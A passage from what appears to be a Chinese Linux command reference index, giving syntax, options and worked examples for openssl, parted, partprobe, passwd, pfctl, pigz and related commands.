dsapublickey.pem\n```\n\n从dsaprivatekey.pem中读取私钥匙，解密并输入新口令进行加密，然后写回文件dsaprivatekey.pem\n\n```shell\n# openssl dsa -in dsaprivatekey.pem -out dsaprivatekey.pem -des3 -passin\n```\n\n **6、RSA应用例子**\n\n产生1024位RSA私匙，用3DES加密它，口令为trousers，输出到文件rsaprivatekey.pem\n\n```shell\n# openssl genrsa -out rsaprivatekey.pem -passout pass:trousers -des3 1024\n```\n\n从文件rsaprivatekey.pem读取私匙，用口令trousers解密，生成的公钥匙输出到文件rsapublickey.pem\n\n```shell\n# openssl rsa -in rsaprivatekey.pem -passin pass:trousers -pubout -out rsapubckey.pem\n```\n\n用公钥匙rsapublickey.pem加密文件plain.txt，输出到文件cipher.txt\n\n```shell\n# openssl rsautl -encrypt -pubin -inkey rsapublickey.pem -in plain.txt -out cipher.txt\n```\n\n使用私钥匙rsaprivatekey.pem解密密文cipher.txt，输出到文件plain.txt\n\n```shell\n# openssl rsautl -decrypt -inkey rsaprivatekey.pem -in cipher.txt -out plain.txt\n```\n\n用私钥匙rsaprivatekey.pem给文件plain.txt签名，输出到文件signature.bin\n\n```shell\n# openssl rsautl -sign -inkey rsaprivatekey.pem -in plain.txt -out signature.bin\n```\n\n用公钥匙rsapublickey.pem验证签名signature.bin，输出到文件plain.txt\n\n```shell\n# openssl rsautl -verify -pubin -inkey rsapublickey.pem -in signature.bin -out plain\n```\n\n从X.509证书文件cert.pem中获取公钥匙，用3DES加密mail.txt，输出到文件mail.enc\n\n```shell\n# openssl smime -encrypt -in mail.txt -des3 -out mail.enc cert.pem\n```\n\n从X.509证书文件cert.pem中获取接收人的公钥匙，用私钥匙key.pem解密S/MIME消息mail.enc，结果输出到文件mail.txt\n\n```shell\n# openssl smime -decrypt -in mail.enc -recip cert.pem -inkey key.pem -out mail.txt\n```\n\ncert.pem为X.509证书文件，用私匙key,pem为mail.txt签名，证书被包含在S/MIME消息中，输出到文件mail.sgn\n\n```shell\n# openssl smime -sign -in mail.txt -signer cert.pem -inkey key.pem -out mail.sgn\n```\n\n验证S/MIME消息mail.sgn，输出到文件mail.txt，签名者的证书应该作为S/MIME消息的一部分包含在mail.sgn中\n\n```shell\n# openssl smime -verify -in mail.sgn -out mail.txt\n```\n\n更多实例:\n\n```shell\nopenssl version -a\nopenssl help\nopenssl genrsa -aes128 -out fd.key 2048 # pem format\nopenssl rsa -text -in fd.key\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","openssl"]},{"title":"【Linux 命令】parted","url":"/linux-command/parted/","content":"\n磁盘分区和分区大小调整工具\n\n## 补充说明\n\n**parted命令** 是由GNU组织开发的一款功能强大的磁盘分区和分区大小调整工具，与fdisk不同，它支持调整分区的大小。作为一种设计用于Linux的工具，它没有构建成处理与fdisk关联的多种分区类型，但是，它可以处理最常见的分区格式，包括：ext2、ext3、fat16、fat32、NTFS、ReiserFS、JFS、XFS、UFS、HFS以及Linux交换分区。\n\n###  语法\n\n```shell\nparted(选项)(参数)\n```\n\n###  选项\n\n```shell\n-h：显示帮助信息；\n-i：交互式模式；\n-s：脚本模式，不提示用户；\n-v：显示版本号。\n```\n\n###  参数\n\n*   设备：指定要分区的硬盘所对应的设备文件；\n*   命令：要执行的parted命令。\n\n###  实例\n\n从串行技术出现以来，越来越多用户选择使用大容量的SATA硬盘创建磁盘阵列；特别是MD1000/MD3000，很轻易就突破2T的LUN，故在此给大家一些指引。\n\n红帽企业 Linux 4 Update 4供对大于 2 terabytes（TB）的磁盘设备的支持。\n\n请参考以下操作步骤：\n\n注：\n\n*   绿色代表你需要使用的命令。\n*   红色代表你需要注意到的输出信息，在后续需要使用。\n\n```shell\n[root@localhost ~]# fdisk -l\nDisk /dev/sda: 35.8 GB, 35862976512 bytes\n255 heads, 63 sectors/track, 4360 cylinders\nUnits = cylinders of 16065 * 512 = 8225280 bytes\n   Device Boot      Start         End      Blocks   id  System\n/dev/sda1   *           1          13      104391   83  Linux\n/dev/sda2              14         144     1052257+  82  Linux swap\n/dev/sda3             145        4360    33865020   83  Linux\nDisk /dev/sdb: 2147 MB, 2147483648 bytes\n255 heads, 63 sectors/track, 261 cylinders\nUnits = cylinders of 16065 * 512 = 8225280 bytes\nDisk /dev/sdb doesn't contain a valid partition table\n```\n\n```shell\n[root@localhost ~]# parted /dev/sdb\nGNU Parted Copyright (C) 1998 - 2004 free Software Foundation, Inc.\nThis program is free software, covered by the GNU General Public License.\nThis program is distributed in the hope that it will be useful, but WITHOUT ANY\nWARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A\nPARTICULAR PURPOSE.  See the GNU General Public License for more details.\n使用/dev/sdb\n(parted)mklabel gpt\n(parted)print\n/dev/sdb的磁盘几何结构：0.000-2048.000兆字节\n磁盘标签类型：gpt\nMinor   起始点       终止点 文件系统   名称                 标志\n(parted)mkpart primary 0 2048  <-----上面print显示的数字\n(parted)print\n/dev/sdb的磁盘几何结构：0.000-2048.000兆字节\n磁盘标签类型：gpt\nMinor   起始点       终止点 文件系统   名称                 标志\n1          0.017   2047.983\n(parted)quit\n```\n\n如果必要，不要忘记更新`/etc/fstab`。\n\n```shell\n[root@localhost ~]# fdisk -l\nDisk /dev/sda: 35.8 GB, 35862976512 bytes\n255 heads, 63 sectors/track, 4360 cylinders\nUnits = cylinders of 16065 * 512 = 8225280 bytes\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sda1   *           1          13      104391   83  Linux\n/dev/sda2              14         144     1052257+  82  Linux swap\n/dev/sda3             145        4360    33865020   83  Linux\nWARNING: GPT (GUID Partition Table) detected on '/dev/sdb'! The util fdisk doesn't support GPT. Use GNU Parted.\n\nDisk /dev/sdb: 2147 MB, 2147483648 bytes\n255 heads, 63 sectors/track, 261 cylinders\nUnits = cylinders of 16065 * 512 = 8225280 bytes\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1               1         262     2097151+  ee  EFI GPT\nPartition 1 has different physical/logical beginnings (non-Linux?):\n     phys=(0, 0, 1) logical=(0,0, 2)\nPartition 1 has different physical/logical endings:\n     phys=(1023, 254, 63) logical=(261, 21, 16)\n```\n\n```shell\n[root@localhost ~]# mkfs.ext3 /dev/sdb1\nmke2fs 1.35 (28-Feb-2004)\nFilesystem label=\nOS type: Linux\nBlock size=4096 (log=2)\nFragment size=4096 (log=2)\n262144 inodes, 524279 blocks\n26213 blocks (5.00%) reserved for the super user\nFirst data block=0\nMaximum filesystem blocks=536870912\n16 block groups\n32768 blocks per group, 32768 fragments per group\n16384 inodes per group\nSuperblock backups stored on blocks:\n        32768, 98304, 163840, 229376, 294912\nWriting inode tables: done\nCreating journal (8192 blocks): done\nWriting superblocks and filesystem accounting information: done\nThis filesystem will be automatically checked every 28 mounts or\n180 days, whichever comes first.  Use tune2fs -c or -i to override.\n```\n\n```shell\n[root@localhost ~]# mount /dev/sdb1 /mnt\n[root@localhost ~]# df -h\nFilesystem            容量  已用 可用 已用% 挂载点\n/dev/sda3              <?xml:namespace prefix = st1 />32G  2.6G   28G   9% /\n/dev/sda1              99M   12M   82M  13% /boot\nnone                  252M     0  252M   0% /dev/shm\n/dev/sdb1             2.0G   36M  1.9G   2% /mnt\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","parted"]},{"title":"【Linux 命令】partprobe","url":"/linux-command/partprobe/","content":"\n不重启的情况下重读分区\n\n## 补充说明\n\n**partprobe命令** 用于重读分区表，当出现删除文件后，出现仍然占用空间。可以partprobe在不重启的情况下重读分区。\n\n###  语法\n\n```shell\npartprobe(选项)(参数)\n```\n\n###  选项\n\n```shell\n-d：不更新内核；\n-s：显示摘要和分区；\n-h：显示帮助信息；\n-v：显示版本信息。\n```\n\n###  参数\n\n设备：指定需要确认分区表改变的硬盘对应的设备文件。\n\n###  实例\n\n使用partprobe不重启系统添加新的磁盘分区，主机自带硬盘超过300GB，目前只划分使用了3个主分区，不到70GB，如下：\n\n```shell\n[root@localhost ~]# df -h \nFilesystem Size Used Avail Use% Mounted on \n/dev/sda1 29G 3.7G  24G 14% / \n/dev/sda2 29G  22G 5.2G 81% /oracle \ntmpfs    2.0G    0 2.0G  0% /dev/shm\n```\n\n```shell\n[root@localhost ~]# cat /proc/partitions\nmajor minor  #blocks  name\n\n   8     0  311427072 sda\n   8     1   30716248 sda1\n   8     2   30716280 sda2\n   8     3    8193150 sda3\n   8    16     976896 sdb\n   8    32     976896 sdc\n\n…省略其他\n```\n\n现在需要给系统添加1个100GB的空间存放数据文件，而又不影响现有系统上业务的运行，使用fdisk结合partprobe命令不重启系统添加一块新的磁盘分区。操作步骤如下：\n\n **第1步 添加新的磁盘分区** ：\n\n```shell\n[root@localhost ~]# fdisk /dev/sda\nThe number of cylinders for this disk is set to 38770.\nThere is nothing wrong with that, but this is larger than 1024,\nand could in certain setups cause problems with:\n1) software that runs at boot time (e.g., old versions of lilo)\n2) booting and partitioning software from other OSs\n   (e.g., DOS FDISK, OS/2 FDISK)\n\ncommand (m for help): p\n\nDisk /dev/sda: 318.9 GB, 318901321728 bytes\n255 heads, 63 sectors/track, 38770 cylinders\nUnits = cylinders of 16065 * 512 = 8225280 bytes\n\n   Device Boot      Start         End      Blocks   id  System\n/dev/sda1   *           1        3824    30716248+  83  Linux\n/dev/sda2            3825        7648    30716280   83  Linux\n/dev/sda3            7649        8668     8193150   82  Linux swap / Solaris\n\nCommand (m for help): n\nCommand action\n   e   extended\n   p   primary partition (1-4)\np\nSelected partition 4\nFirst cylinder (8669-38770, default 8669):\nUsing default value 8669\nlast cylinder or +size or +sizeM or +sizeK (8669-38770, default 38770): +100G   \nCommand (m for help): w\nThe partition table has been altered!\n\nCalling ioctl() to re-read partition table.\n\nWARNING: Re-reading the partition table failed with error 16: \n\nDevice or resource busy.\nThe kernel still uses the old table.\nThe new table will be used at the next reboot.\nSyncing disks.\n```\n\n **第2步 使用工具partprobe让kernel读取分区信息：** \n\n```shell\n[root@localhost ~]# partprobe\n```\n\n使用fdisk工具只是将分区信息写到磁盘，如果需要mkfs磁盘分区则需要重启系统，而使用partprobe则可以使kernel重新读取分区信息，从而避免重启系统。\n\n **第3步 格式化文件系统：** \n\n```shell\n[root@localhost ~]# mkfs.ext3 /dev/sda4\nmke2fs 1.39 (29-May-2006)\nFilesystem label=\nOS type: Linux\nBlock size=4096 (log=2)\nFragment size=4096 (log=2)\n12222464 inodes, 24416791 blocks\n1220839 blocks (5.00%) reserved for the super user\nFirst data block=0\nMaximum filesystem blocks=4294967296\n746 block groups\n32768 blocks per group, 32768 fragments per group\n16384 inodes per group\nSuperblock backups stored on blocks:\n        32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, \n　　　　2654208, 4096000, 7962624, 11239424, 20480000, 23887872\n\nWriting inode tables: done\nCreating journal (32768 blocks): done\nWriting superblocks and filesystem accounting information:\n\ndone\n\nThis filesystem will be automatically checked every 26 mounts or\n180 days, whichever comes first.  Use tune2fs -c or -i to override.\n[root@localhost ~]#\n```\n\n **第4步 mount新的分区`/dev/sda4`：** \n\n```shell\n[root@localhost ~]# e2label  /dev/sda4 /data\n[root@localhost ~]# mkdir /data\n[root@localhost ~]# mount /dev/sda4 /data\n[root@localhost ~]# df\nFilesystem           1K-blocks      Used Available Use% Mounted on\n/dev/sda1             29753556   3810844  24406900  14% /\n/dev/sda2             29753588  11304616  16913160  41% /oracle\ntmpfs                  2023936         0   2023936   0% /dev/shm\n/dev/sda4             96132968    192312  91057300   1% /data\n```\n\n使用partprobe可以不用重启系统即可配合fdisk工具创建新的分区。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","partprobe"]},{"title":"【Linux 命令】passwd","url":"/linux-command/passwd/","content":"\n用于让用户可以更改自己的密码\n\n## 补充说明\n\n**passwd命令** 用于设置用户的认证信息，包括用户密码、密码过期时间等。系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。\n\n###  语法\n\n```shell\npasswd(选项)(参数)\n```\n\n###  选项\n\n```shell\n-d：删除密码，仅有系统管理者才能使用；\n-f：强制执行；\n-k：设置只有在密码过期失效后，方能更新；\n-l：锁住密码；\n-s：列出密码的相关信息，仅有系统管理者才能使用；\n-u：解开已上锁的帐号。\n```\n\n###  参数\n\n用户名：需要设置密码的用户名。\n\n###  知识扩展\n\n与用户、组账户信息相关的文件\n\n存放用户信息：\n\n```shell\n/etc/passwd\n/etc/shadow\n```\n\n存放组信息：\n\n```shell\n/etc/group\n/etc/gshadow\n```\n\n用户信息文件分析（每项用`:`隔开）\n\n```shell\n例如：jack:X:503:504:::/home/jack/:/bin/bash\njack　　# 用户名\nX　　# 口令、密码\n503　　# 用户id（0代表root、普通新建用户从500开始）\n504　　# 所在组\n:　　# 描述\n/home/jack/　　# 用户主目录\n/bin/bash　　# 用户缺省Shell\n```\n\n组信息文件分析\n\n```shell\n例如：jack:$!$:???:13801:0:99999:7:*:*:\njack　　# 组名\n$!$　　# 被加密的口令\n13801　　# 创建日期与今天相隔的天数\n0　　# 口令最短位数\n99999　　# 用户口令\n7　　# 到7天时提醒\n*　　# 禁用天数\n*　　# 过期天数\n```\n\n###  实例\n\n如果是普通用户执行passwd只能修改自己的密码。如果新建用户后，要为新用户创建密码，则用passwd用户名，注意要以root用户的权限来创建。\n\n```shell\n[root@localhost ~]# passwd linuxde     # 更改或创建linuxde用户的密码；\nChanging password for user linuxde.\nNew UNIX password:           # 请输入新密码；\nRetype new UNIX password:    # 再输入一次；\npasswd: all authentication tokens updated successfully.  # 成功；\n```\n\n普通用户如果想更改自己的密码，直接运行passwd即可，比如当前操作的用户是linuxde。\n\n```shell\n[linuxde@localhost ~]$ passwd\nChanging password for user linuxde.  # 更改linuxde用户的密码；\n(current) UNIX password:    # 请输入当前密码；\nNew UNIX password:          # 请输入新密码；\nRetype new UNIX password:   # 确认新密码；\npasswd: all authentication tokens updated successfully.  # 更改成功；\n```\n\n比如我们让某个用户不能修改密码，可以用`-l`选项来锁定：\n\n```shell\n[root@localhost ~]# passwd -l linuxde     # 锁定用户linuxde不能更改密码；\nLocking password for user linuxde.\npasswd: Success            # 锁定成功；\n\n[linuxde@localhost ~]# su linuxde    # 通过su切换到linuxde用户；\n[linuxde@localhost ~]$ passwd       # linuxde来更改密码；\nChanging password for user linuxde.\nChanging password for linuxde\n(current) UNIX password:           # 输入linuxde的当前密码；\npasswd: Authentication token manipulation error      # 失败，不能更改密码；\n```\n\n再来一例：\n\n```shell\n[root@localhost ~]# passwd -d linuxde   # 清除linuxde用户密码；\nRemoving password for user linuxde.\npasswd: Success                          # 清除成功；\n\n[root@localhost ~]# passwd -S linuxde     # 查询linuxde用户密码状态；\nEmpty password.                          # 空密码，也就是没有密码；\n```\n\n注意：当我们清除一个用户的密码时，登录时就无需密码，这一点要加以注意。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","passwd"]},{"title":"【Linux 命令】paste","url":"/linux-command/paste/","content":"\n将多个文件按列队列合并\n\n## 补充说明\n\n**paste命令** 用于将多个文件按照列队列进行合并。\n\n###  语法\n\n```shell\npaste(选项)(参数)\n```\n\n###  选项\n\n```shell\n-d<间隔字符>或--delimiters=<间隔字符>：用指定的间隔字符取代跳格字符；\n-s或——serial串列进行而非平行处理。\n```\n\n###  参数\n\n文件列表：指定需要合并的文件列表。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","paste"]},{"title":"【Linux 命令】patch","url":"/linux-command/patch/","content":"\n为开放源代码软件安装补丁程序\n\n## 补充说明\n\n**patch命令** 被用于为开放源代码软件安装补丁程序。让用户利用设置修补文件的方式，修改，更新原始文件。如果一次仅修改一个文件，可直接在命令列中下达指令依序执行。如果配合修补文件的方式则能一次修补大批文件，这也是Linux系统核心的升级方法之一。\n\n###  语法\n\n```shell\npatch(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b或--backup：备份每一个原始文件；\n-B<备份字首字符串>或--prefix=<备份字首字符串>：设置文件备份时，附加在文件名称前面的字首字符串，该字符串可以是路径名称；\n-c或--context：把修补数据解译成关联性的差异；\n-d<工作目录>或--directory=<工作目录>：设置工作目录；\n-D<标示符号>或--ifdef=<标示符号>：用指定的符号把改变的地方标示出来；\n-e或--ed：把修补数据解译成ed指令可用的叙述文件；\n-E或--remove-empty-files：若修补过后输出的文件其内容是一片空白，则移除该文件；\n-f或--force：此参数的效果和指定\"-t\"参数类似，但会假设修补数据的版本为新版本；\n-F<监别列数>或--fuzz<监别列数>：设置监别列数的最大值；\n-g<控制数值>或--get=<控制数值>：设置以RSC或SCCS控制修补作业；\n-i<修补文件>或--input=<修补文件>：读取指定的修补问家你；\n-l或--ignore-whitespace：忽略修补数据与输入数据的跳格，空格字符；\n-n或--normal：把修补数据解译成一般性的差异；\n-N或--forward：忽略修补的数据较原始文件的版本更旧，或该版本的修补数据已使 用过；\n-o<输出文件>或--output=<输出文件>：设置输出文件的名称，修补过的文件会以该名称存放；\n-p<剥离层级>或--strip=<剥离层级>：设置欲剥离几层路径名称；\n-f<拒绝文件>或--reject-file=<拒绝文件>：设置保存拒绝修补相关信息的文件名称，预设的文件名称为.rej；\n-R或--reverse：假设修补数据是由新旧文件交换位置而产生；\n-s或--quiet或--silent：不显示指令执行过程，除非发生错误；\n-t或--batch：自动略过错误，不询问任何问题；\n-T或--set-time：此参数的效果和指定\"-Z\"参数类似，但以本地时间为主；\n-u或--unified：把修补数据解译成一致化的差异；\n-v或--version：显示版本信息；\n-V<备份方式>或--version-control=<备份方式>：用\"-b\"参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，这个字符串不仅可用\"-z\"参数变更，当使用\"-V\"参数指定不同备份方式时，也会产生不同字尾的备份字符串；\n-Y<备份字首字符串>或--basename-prefix=--<备份字首字符串>：设置文件备份时，附加在文件基本名称开头的字首字符串；\n-z<备份字尾字符串>或--suffix=<备份字尾字符串>：此参数的效果和指定\"-B\"参数类似，差别在于修补作业使用的路径与文件名若为src/linux/fs/super.c，加上\"backup/\"字符串后，文件super.c会备份于/src/linux/fs/backup目录里；\n-Z或--set-utc：把修补过的文件更改，存取时间设为UTC；\n--backup-if-mismatch：在修补数据不完全吻合，且没有刻意指定要备份文件时，才备份文件；\n--binary：以二进制模式读写数据，而不通过标准输出设备；\n--help：在线帮助；\n--nobackup-if-mismatch：在修补数据不完全吻合，且没有刻意指定要备份文件时，不要备份文件；\n--verbose：详细显示指令的执行过程。\n```\n\n###  参数\n\n* 原文件：指定需要打补丁的原始文件；\n* 补丁文件：指定补丁文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","patch"]},{"title":"【Linux 命令】pathchk","url":"/linux-command/pathchk/","content":"\n检查文件中不可移植的部分\n\n## 补充说明\n\n**pathchk命令** 用来检查文件中不可移植的部分。\n\n###  语法\n\n```shell\npathchk(选项)(参数)\n```\n\n###  选项\n\n```shell\n-p：检查大多数的POSIX系统；\n-P：检查空名字和“-”开头的文件；\n--portability：检查所有的POSIX系统，等同于“-P-p”选项；\n--help：显示帮助；\n--wersion：显示版本号。\n```\n\n###  参数\n\n*   文件：带路径信息的文件；\n*   后缀：可选参数，指定要去除的文件后缀字符串。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pathchk"]},{"title":"【Linux 命令】perl","url":"/linux-command/perl/","content":"\nperl语言解释器\n\n## 补充说明\n\n**perl命令** 是perl语言解释器，负责解释执行perl语言程序。\n\n###  语法\n\n```shell\nperl(选项)(参数)\n```\n\n###  选项\n\n```shell\n-w：输出有用的警告信息；\n-U：允许不安全的操作；\n-c：仅检查文件的语法；\n-d：在调试下运行脚本程序。\n```\n\n###  参数\n\n文件：要运行的perl脚本程序。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","perl"]},{"title":"【Linux 命令】pfctl","url":"/linux-command/pfctl/","content":"\nPF防火墙的配置命令\n\n## 补充说明\n\n**pfctl命令** 是PF防火墙的配置命令，PF防火墙( 全称：Packet Filter )是UNIX LIKE系统上进行TCP/ip流量过滤和网络地址转换的软件系统。PF同样也能提供TCP/IP流量的整形和控制，并且提供带宽控制和数据包优先集控制。PF最早是由Daniel Hartmeier开发的，现在的开发和维护由Daniel和openBSD小组的其他成员负责。\n\nPF防火墙的功能很多，本站只列举一些基本配置。\n\n### 激活\n\n要激活pf并且使它在启动时调用配置文件，编辑`/etc/rc.conf`文件，修改配置pf的一行：\n\n```shell\npf=yes\n```\n\n重启操作系统让配置生效。\n\n也可以通过pfctl程序启动和停止pf：\n\n```shell\npfctl -e\npfctl -d\n```\n\n注意这仅仅是启动和关闭PF，实际它不会载入规则集，规则集要么在系统启动时载入，要在PF启动后通过命令单独载入。\n\n### 配置\n\n系统引导到在rc脚本文件运行PF时PF从`/etc/pf.conf`文件载入配置规则。注意当`/etc/pf.conf`文件是默认配置文件，在系统调用rc脚本文件时，它仅仅是作为文本文件由pfctl装入并解释和插入pf的。对于一些应用来说，其他的规则集可以在系统引导后由其他文件载入。对于一些设计的非常好的unix程序，PF提供了足够的灵活性。\n\n **pf.conf文件有7个部分：** \n\n1.  宏：用户定义的变量，包括IP地址，接口名称等等。\n2.  表：一种用来保存IP地址列表的结构。\n3.  选项：控制PF如何工作的变量。\n4.  整形：重新处理数据包，进行正常化和碎片整理。\n5.  排队：提供带宽控制和数据包优先级控制。\n6.  转换：控制网络地址转换和数据包重定向。\n7.  过滤规则：在数据包通过接口时允许进行选择性的过滤和阻止。\n\n除去宏和表，其他的段在配置文件中也应该按照这个顺序出现，尽管对于一些特定的应用并不是所有的段都是必须的。\n\n空行会被忽略，以#开头的行被认为是注释。\n\n### 控制\n\n引导之后，PF可以通过pfctl程序进行操作，以下是一些例子：\n\n```shell\npfctl -f /etc/pf.conf  # 载入 pf.conf 文件\npfctl -nf /etc/pf.conf # 解析文件，但不载入\npfctl -Nf /etc/pf.conf # 只载入文件中的NAT规则\npfctl -Rf /etc/pf.conf # 只载入文件中的过滤规则\npfctl -sn # 显示当前的NAT规则\npfctl -sr # 显示当前的过滤规则\npfctl -ss # 显示当前的状态表\npfctl -si # 显示过滤状态和计数\npfctl -sa # 显示任何可显示的\n```\n\n完整的命令列表，请参阅pfctl的man手册页。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pfctl"]},{"title":"【Linux 命令】pgrep","url":"/linux-command/pgrep/","content":"\n根据用户给出的信息在当前运行进程中查找并列出符合条件的进程ID（PID）\n\n## 补充说明\n\n**pgrep命令** 以名称为依据从运行进程队列中查找进程，并显示查找到的进程id。每一个进程ID以一个十进制数表示，通过一个分割字符串和下一个ID分开，默认的分割字符串是一个新行。对于每个属性选项，用户可以在命令行上指定一个以逗号分割的可能值的集合。\n\n###  语法\n\n```shell\npgrep(选项)(参数)\n```\n\n###  选项\n\n```shell\n-o：仅显示找到的最小（起始）进程号；\n-n：仅显示找到的最大（结束）进程号；\n-l：显示进程名称；\n-P：指定父进程号；\n-g：指定进程组；\n-t：指定开启进程的终端；\n-u：指定进程的有效用户ID。\n```\n\n###  参数\n\n进程名称：指定要查找的进程名称，同时也支持类似grep指令中的匹配模式。\n\n###  实例\n\n```shell\npgrep -lo httpd\n4557 httpd\n [root@localhost ~]# pgrep -ln httpd\n4566 httpd\n\n[root@localhost ~]# pgrep -l httpd\n4557 httpd\n4560 httpd\n4561 httpd\n4562 httpd\n4563 httpd\n4564 httpd\n4565 httpd\n4566 httpd\n\n[root@localhost ~]# pgrep httpd 4557\n4560\n4561\n4562\n4563\n4564\n4565\n4566\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pgrep"]},{"title":"【Linux 命令】php","url":"/linux-command/php/","content":"\nPHP语言的命令行接口\n\n## 补充说明\n\n**php命令** 是流行的Web开发语言PHP的命令行接口，可以使用PHP语言开发基于命令行的系统管理脚本程序。\n\n###  语法\n\n```shell\nphp(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：进入交互模式；\n-c：指定“php.ini”的搜索路径。\n```\n\n###  参数\n\n文件：要执行的php脚本。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","php"]},{"title":"【Linux 命令】pico","url":"/linux-command/pico/","content":"\n功能强大全屏幕的文本编辑器\n\n## 补充说明\n\n**pico命令** 是功能强大全屏幕的文本编辑器。pico的操作简单，提供了丰富的快捷键。常用的快捷键如下：\n\n```shell\nCtrl+G：获得pico的帮助信息；\nCtrl+O：保存文件内容，如果是新文件，需要输入文件名；\nCtrl+R：在当前光标位置插入一个指定的文本文件内容；\nCtrl+Y：向前翻页；\nCtrl+V：向后翻页；\nCtrl+w：对文件进行搜索；\nCtrl+K：剪切当前文件行到粘贴缓冲区；\nCtrl+U：粘贴缓冲区中的内容到当前光标所在位置；\nCtrl+C：显示当前光标位置；\nCtrl+T：调用拼写检查功能，对文档进行拼写检查；\nCtrl+J：段落重排；\nCtrl+X：退出，当文件内容发生改变时，提供是否保存修改。\n```\n\n###  语法\n\n```shell\npico(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b：开启置换的功能；\n-d：开启删除的功能；\n-e：使用完整的文件名称；\n-f：支持键盘上F1、F2...功能键；\n-g：显示光标；\n-h：在线帮助；\n-j：开启切换的功能；\n-k：预设pico在使用剪下命令时，会把光标所在的列的内容全部删除；\n-m：开启鼠标支持的功能，您可用鼠标点选命令列表；\n-n<间隔秒数>：设置多久检查一次新邮件；\n-o<工作目录>：设置工作目录；\n-q：忽略预设值；\n-r<编辑页宽>：设置编辑文件的页宽；\n-s<拼字检查器>：另外指定拼字检查器；\n-t：启动工具模式；\n-v：启动阅读模式，用户只能观看，无法编辑文件的内容；\n-w：关闭自动换行，通过这个参数可以编辑内容很长的列；\n-x：关闭页面下方的命令列表；\n-z：让pico可被Ctrl+z中断，暂存在后台作业里；\n+<列表编号>：执行pico指令进入编辑模式时，从指定的列数开始编辑。\n```\n\n###  参数\n\n文件：指定要编辑的文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pico"]},{"title":"【Linux 命令】pidof","url":"/linux-command/pidof/","content":"\n查找指定名称的进程的进程号ID号\n\n## 补充说明\n\n**pidof命令** 用于查找指定名称的进程的进程号id号。\n\n###  语法\n\n```shell\npidof(选项)(参数)\n```\n\n###  选项\n\n```shell\n-s：仅返回一个进程号；\n-c：仅显示具有相同“root”目录的进程；\n-x：显示由脚本开启的进程；\n-o：指定不显示的进程ID。\n```\n\n###  参数\n\n进程名称：指定要查找的进程名称。\n\n###  实例\n\n```shell\npidof nginx\n13312 5371\n\npidof crond\n1509\n\npidof init\n1\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pidof"]},{"title":"【Linux 命令】pigz","url":"/linux-command/pigz/","content":"\n可以用来解压缩文件，gzip的并行实现升级版\n\n## 补充说明\n\n**pigz命令**可以用来解压缩文件，最重要的是支持多线程并行处理，解压缩比gzip快。主页: [http://zlib.net/pigz/](http://zlib.net/pigz/)\n\n### 语法\n\n```shell\npigz [ -cdfhikKlLmMnNqrRtz0..9,11 ] [ -b blocksize ] [ -p threads ] [ -S suffix ] [ name ...  ]\nunpigz [ -cfhikKlLmMnNqrRtz ] [ -b blocksize ] [ -p threads ] [ -S suffix ] [ name ...  ]\n```\n\n### 参数\n\n```shell\n-0 to -9, -11       # Compression level (level 11, zopfli, is much slower)\n--fast, --best      # Compression levels 1 and 9 respectively\n-b, --blocksize mmm # Set compression block size to mmmK (default 128K)\n-c, --stdout        # Write all processed output to stdout (won't delete)\n-d, --decompress    # Decompress the compressed input\n-f, --force         # Force overwrite, compress .gz, links, and to terminal\n-F  --first         # Do iterations first, before block split for -11\n-h, --help          # Display a help screen and quit\n-i, --independent   # Compress blocks independently for damage recovery\n-I, --iterations n  # Number of iterations for -11 optimization\n-J, --maxsplits n   # Maximum number of split blocks for -11\n-k, --keep          # Do not delete original file after processing\n-K, --zip           # Compress to PKWare zip (.zip) single entry format\n-l, --list          # List the contents of the compressed input\n-L, --license       # Display the pigz license and quit\n-m, --no-time       # Do not store or restore mod time\n-M, --time          # Store or restore mod time\n-n, --no-name       # Do not store or restore file name or mod time\n-N, --name          # Store or restore file name and mod time\n-O  --oneblock      # Do not split into smaller blocks for -11\n-p, --processes n   # Allow up to n compression threads (default is the number of online processors, or 8 if unknown)\n-q, --quiet         # Print no messages, even on error\n-r, --recursive     # Process the contents of all subdirectories\n-R, --rsyncable     # Input-determined block locations for rsync\n-S, --suffix .sss   # Use suffix .sss instead of .gz (for compression)\n-t, --test          # Test the integrity of the compressed input\n-v, --verbose       # Provide more verbose output\n-V  --version       # Show the version of pigz\n-Y  --synchronous   # Force output file write to permanent storage\n-z, --zlib          # Compress to zlib (.zz) instead of gzip format\n--                  # All arguments after \"--\" are treated as files\n```\n\n### 实例\n\n可以结合`tar`使用, 压缩命令\n\n```shell\ntar -cvf - dir1 dir2 dir3 | pigz -p 8 > output.tgz\n```\n\n解压命令\n\n```shell\npigz -p 8 -d output.tgz\n```\n\n如果是gzip格式，也支持用tar解压\n\n```shell\ntar -xzvf output.tgz\n```\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","pigz"]},{"title":"【Linux 命令】ping","url":"/linux-command/ping/","content":"\n测试主机之间网络的连通性\n\n## 补充说明\n\n**ping命令** 用来测试主机之间网络的连通性。执行ping指令会使用ICMP传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常。\n\n###  语法\n\n```shell\nping(选项)(参数)\n```\n\n###  